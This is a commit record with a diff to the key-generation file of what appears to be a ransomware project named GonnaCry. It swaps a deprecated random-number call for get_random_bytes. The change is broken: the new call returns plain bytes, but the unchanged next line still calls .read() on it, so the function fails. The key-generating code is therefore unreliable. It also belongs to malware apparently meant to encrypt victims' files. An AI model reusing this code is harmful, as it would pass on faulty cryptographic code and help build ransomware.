056390b17fca5cdb6861fbcaabec008d8ee901ec
Aurélien <au2001sfg@gmail.com>
2021-06-21 14:45:48 +0200

    Fix Crypto Random

--- src/GonnaCry/generate_keys.py
+++ src/GonnaCry/generate_keys.py
@@ -1,10 +1,10 @@
 import base64
-import Crypto.Random 
+import Crypto.Random
 
 def generate_key(bits, encode=False):
-    generated = Crypto.Random.OSRNG.posix.DevURandomRNG()
+    generated = Crypto.Random.get_random_bytes(bits // 8)
     content = generated.read(bits)
-    
+
     if(encode):
         return base64.b64encode(content)
 
